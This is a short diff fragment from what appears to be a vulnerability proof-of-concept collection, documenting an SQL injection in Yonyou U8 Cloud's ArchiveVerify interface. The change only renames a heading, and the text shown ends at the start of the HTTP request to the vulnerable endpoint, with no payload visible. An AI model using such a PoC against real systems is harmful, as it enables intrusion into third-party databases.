@@ -1,7 +1,7 @@
 ## 用友U8 Cloud-ArchiveVerify存在SQL注入漏洞
 
 
-## poc
+## POC
 ```
 POST /u8cuapws/rest/archive/verify HTTP/1.1
 Host: your-ip
